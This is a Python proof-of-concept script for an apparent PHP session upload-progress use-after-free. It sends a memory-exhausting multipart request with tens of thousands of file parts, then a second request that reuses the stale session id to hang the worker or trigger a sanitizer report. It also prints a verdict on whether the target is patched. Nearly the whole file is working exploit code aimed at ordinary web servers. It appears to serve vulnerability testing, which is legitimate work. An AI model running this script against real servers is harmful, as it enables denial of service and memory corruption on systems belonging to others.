#!/usr/bin/env python3
# INDEX: upload-progress startup-oom stale ps(id) reuse uaf | cli apache | needs survive-startup sapi
"""upload_progress_uaf.py - CVE-2026-109619 session upload-progress family.

Two requests on the same worker. R1 posts an upload-progress multipart that
OOMs during php_hash_environment() (before RINIT): the upload-progress handler
has already published session state, but its reset is skipped and the request
heap is freed with a stale PS(id). R2's upload-progress request reaches session
handling before RINIT and reuses that stale PS(id) from the freed heap -> on a
vulnerable build the consumer self-deadlocks (worker hang) or ASan reports the
stale read; a patched build completes normally. Requires a SAPI that survives a
failed startup (php -S / mod_php).

Usage:
    python3 -I poc/bugs/upload_progress_uaf.py http://127.0.0.1:8081 [--parts N]
"""
from __future__ import annotations

import argparse
import os
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_urllib import http, report  # noqa: E402
from common.multipart import part_tuple as part, multipart_default as multipart  # noqa: E402
from primitives.groom.upload_progress_seed import file_parts, progress_preamble  # noqa: E402


def run(args):
    base = args.url.rstrip("/")

    # R1: publish session state via upload progress, then OOM before RINIT.
    parts = progress_preamble() + list(file_parts(args.parts, name_len=16))
    body, headers = multipart(parts)
    print(f"[R1 producer] POST {base}/poc.php ({args.parts} file parts w/ upload "
          f"progress, {len(body)} wire bytes)")
    s, b = http(base + "/poc.php", data=body, headers=headers)
    report("R1 producer", s, b, base)

    # R2: consumer - upload progress reaches session handling before RINIT and
    # reuses the stale PS(id) / PS(http_session_vars) from the freed heap.
    parts = progress_preamble() + [part("victim", b"V" * 1024,
                                         filename="victim.bin", ctype="application/octet-stream")]
    body, headers = multipart(parts)
    print(f"[R2 consumer] POST {base}/poc.php ({len(body)} wire bytes)")
    s, b = http(base + "/poc.php", data=body, headers=headers, timeout=25)
    report("R2 consumer", s, b, base, short_timeout=8)
    print("[upload_progress_uaf] verdict: R2 completed -> patched; R2 hung/dead -> vulnerable. "
          "Run against cli-asan for the definitive report "
          "(php_session_initialize / ps_read_files on stale PS(id)).")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("url")
    ap.add_argument("--parts", type=int, default=40000)
    run(ap.parse_args())


if __name__ == "__main__":
    main()
